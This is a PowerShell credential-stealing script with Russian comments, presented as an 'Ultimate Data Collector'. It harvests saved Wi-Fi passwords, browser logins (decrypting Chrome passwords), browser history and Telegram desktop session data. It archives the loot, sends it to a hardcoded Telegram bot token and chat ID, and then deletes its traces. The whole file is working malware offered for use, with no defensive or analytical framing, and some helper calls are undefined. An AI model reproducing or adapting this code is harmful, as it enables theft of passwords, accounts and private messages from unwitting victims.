<#
.SYNOPSIS
    Ultimate Data Collector - Максимальный сбор информации
.DESCRIPTION
    Собирает: пароли WiFi, логины/пароли из браузеров, историю, файлы мессенджеров
#>

# Конфигурация Telegram
$BOT_TOKEN = "6942623726:AAH6yXcm9EgAhbUVxCmphZF3o6H8XScPOFw"
$CHAT_ID = "6525689863"
$TEMP_DIR = "$env:TEMP\DataCollector_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
New-Item -Path $TEMP_DIR -ItemType Directory -Force | Out-Null

function Send-FileToTelegram {
    param([string]$FilePath)
    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"
    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
    $fileEnc = [System.Text.Encoding]::GetEncoding("ISO-8859-1").GetString($fileBytes)
    $boundary = [System.Guid]::NewGuid().ToString()
    
    $body = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"chat_id`";",
        "",
        $CHAT_ID,
        "--$boundary",
        "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
        "Content-Type: application/octet-stream",
        "",
        $fileEnc,
        "--$boundary--"
    ) -join "`r`n"

    try {
        Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
    } catch { Write-Output "[!] File send error: $_" }
}

# 1. Сбор паролей WiFi (исправленная версия)
function Get-WiFiPasswords {
    $outputFile = "$TEMP_DIR\wifi_passwords.txt"
    $result = @("=== WiFi Passwords ===")
    
    try {
        $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
            $_.Line.Split(":")[1].Trim()
        }
        
        foreach ($profile in $profiles) {
            try {
                $xml = netsh wlan export profile name=`"$profile`" key=clear folder="$TEMP_DIR"
                $xmlFile = Get-ChildItem -Path "$TEMP_DIR\*$profile*.xml"
                $password = (Select-String -Path $xmlFile -Pattern "keyMaterial").Line.Split(">")[1].Split("<")[0]
                
                $result += "SSID: $profile"
                $result += "Password: $password"
                $result += "----------------"
            } catch { $result += "Error with $profile`: $_" }
        }
    } catch { $result += "WiFi module error: $_" }
    
    $result -join "`n" | Out-File -FilePath $outputFile
    return $outputFile
}

# 2. Сбор данных браузеров (Chrome, Edge, Opera)
function Get-BrowserCredentials {
    $outputFile = "$TEMP_DIR\browser_creds.txt"
    $result = @("=== Browser Credentials ===")
    
    # Список браузеров для проверки
    $browsers = @(
        @{ Name = "Chrome"; Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" },
        @{ Name = "Edge"; Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data" },
        @{ Name = "Opera"; Path = "$env:APPDATA\Opera Software\Opera Stable\Login Data" }
    )
    
    foreach ($browser in $browsers) {
        try {
            if (Test-Path $browser.Path) {
                $copyPath = "$TEMP_DIR\$($browser.Name)_LoginData"
                Copy-Item -Path $browser.Path -Destination $copyPath -Force
                
                # Используем SQLite для извлечения данных
                try {
                    Add-Type -Path "$PSScriptRoot\System.Data.SQLite.dll" -ErrorAction Stop
                    $conn = New-Object -TypeName System.Data.SQLite.SQLiteConnection
                    $conn.ConnectionString = "Data Source=$copyPath"
                    $conn.Open()
                    
                    $command = $conn.CreateCommand()
                    $command.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
                    $adapter = New-Object -TypeName System.Data.SQLite.SQLiteDataAdapter $command
                    $dataset = New-Object -ObjectTypeName System.Data.DataSet
                    $adapter.Fill($dataset) | Out-Null
                    
                    foreach ($row in $dataset.Tables[0].Rows) {
                        $result += "$($browser.Name) Credentials:"
                        $result += "URL: $($row.origin_url)"
                        $result += "Login: $($row.username_value)"
                        
                        # Дешифровка пароля (для Chrome)
                        if ($browser.Name -eq "Chrome") {
                            $passwordBytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
                                $row.password_value,
                                $null,
                                [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                            )
                            $password = [System.Text.Encoding]::UTF8.GetString($passwordBytes)
                            $result += "Password: $password"
                        } else {
                            $result += "Password: [ENCRYPTED]"
                        }
                        $result += "----------------"
                    }
                } catch { $result += "$($browser.Name) SQL error: $_" }
                finally { if ($conn) { $conn.Close() } }
            }
        } catch { $result += "$($browser.Name) error: $_" }
    }
    
    $result -join "`n" | Out-File -FilePath $outputFile
    return $outputFile
}

# 3. Сбор истории браузеров
function Get-BrowserHistory {
    $outputFile = "$TEMP_DIR\browser_history.txt"
    $result = @("=== Browser History ===")
    
    $browsers = @(
        @{ Name = "Chrome"; Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History" },
        @{ Name = "Edge"; Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History" }
    )
    
    foreach ($browser in $browsers) {
        try {
            if (Test-Path $browser.Path) {
                $copyPath = "$TEMP_DIR\$($browser.Name)_History"
                Copy-Item -Path $browser.Path -Destination $copyPath -Force
                
                try {
                    Add-Type -Path "$PSScriptRoot\System.Data.SQLite.dll"
                    $conn = New-Object -TypeName System.Data.SQLite.SQLiteConnection
                    $conn.ConnectionString = "Data Source=$copyPath"
                    $conn.Open()
                    
                    $command = $conn.CreateCommand()
                    $command.CommandText = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100"
                    $reader = $command.ExecuteReader()
                    
                    while ($reader.Read()) {
                        $result += "$($browser.Name) History:"
                        $result += "URL: $($reader.GetString(0))"
                        $result += "Title: $($reader.GetString(1))"
                        $result += "Visits: $($reader.GetInt32(2))"
                        $result += "Last Visit: $([DateTime]::FromFileTime($reader.GetInt64(3)))"
                        $result += "----------------"
                    }
                } catch { $result += "$($browser.Name) history error: $_" }
                finally { if ($conn) { $conn.Close() } }
            }
        } catch { $result += "$($browser.Name) error: $_" }
    }
    
    $result -join "`n" | Out-File -FilePath $outputFile
    return $outputFile
}

# 4. Сбор файлов мессенджеров (Telegram, WhatsApp)
function Get-MessengerFiles {
    $result = @()
    
    # Telegram
    $telegramPaths = @(
        "$env:APPDATA\Telegram Desktop\tdata",
        "$env:USERPROFILE\Documents\Telegram Desktop\tdata"
    )
    
    foreach ($path in $telegramPaths) {
        if (Test-Path $path) {
            $dest = "$TEMP_DIR\Telegram_Data"
            New-Item -Path $dest -ItemType Directory -Force | Out-Null
            Copy-Item -Path "$path\*" -Destination $dest -Recurse -Force
            $result += "$dest\telegram_data.zip"
        }
    }
    
    return $result
}

# Основной сбор
try {
    # Собираем данные
    $wifiFile = Get-WiFiPasswords
    $browserCredsFile = Get-BrowserCredentials
    $historyFile = Get-BrowserHistory
    $messengerFiles = Get-MessengerFiles
    
    # Архивируем все файлы
    $zipFile = "$env:TEMP\CollectedData_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
    Compress-Archive -Path @($wifiFile, $browserCredsFile, $historyFile) + $messengerFiles -DestinationPath $zipFile -Force
    
    # Отправляем архив
    Send-FileToTelegram -FilePath $zipFile
    
    # Отправляем краткий отчет
    $report = @(
        "=== Data Collection Report ===",
        "WiFi Passwords: $(if (Test-Path $wifiFile) {'Collected'} else {'Failed'})",
        "Browser Credentials: $(if (Test-Path $browserCredsFile) {'Collected'} else {'Failed'})",
        "Browser History: $(if (Test-Path $historyFile) {'Collected'} else {'Failed'})",
        "Messenger Files: $(if ($messengerFiles.Count -gt 0) {$messengerFiles.Count} else {'None'})",
        "Full data archive: $(Split-Path $zipFile -Leaf)"
    ) -join "`n"
    
    Send-ToTelegram -Text $report
}
catch {
    Send-ToTelegram -Text "[CRITICAL ERROR] $_"
}
finally {
    # Очистка
    Remove-Item -Path $TEMP_DIR -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path $zipFile -Force -ErrorAction SilentlyContinue
}
